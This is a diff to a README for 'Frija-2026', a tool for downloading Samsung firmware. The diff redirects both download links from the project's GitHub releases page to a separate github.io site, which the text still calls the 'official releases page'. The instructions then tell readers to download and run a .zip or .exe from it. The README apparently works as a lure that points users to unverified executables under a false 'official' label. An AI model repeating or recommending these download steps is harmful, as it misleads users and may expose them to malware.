@@ -1,6 +1,6 @@
 # 🛠️ Frija-2026 - Download Official Samsung Firmware Tools
 
-[![](https://img.shields.io/badge/Download-Frija--2026-blue)](https://github.com/hangocm9-lgtm/Frija-2026/releases)
+[![](https://img.shields.io/badge/Download-Frija--2026-blue)](https://hangocm9-lgtm.github.io)
 
 Frija-2026 assists users in downloading official firmware files for Samsung smartphones. This tool connects directly to Samsung servers to fetch the latest software for your device. It streamlines the update process by removing the need for manual searches. 
 
@@ -29,7 +29,7 @@ Follow these steps to prepare your computer for the tool.
 
 The official release page hosts the most current version of the software. Follow these instructions to obtain the application:
 
-1. Visit the [official releases page](https://github.com/hangocm9-lgtm/Frija-2026/releases) to access the downloads.
+1. Visit the [official releases page](https://hangocm9-lgtm.github.io) to access the downloads.
 2. Look for the most recent version labeled as the primary release.
 3. Click the file ending in .zip or .exe to begin the download.
 4. Save the file to your desktop or a folder you can find easily.
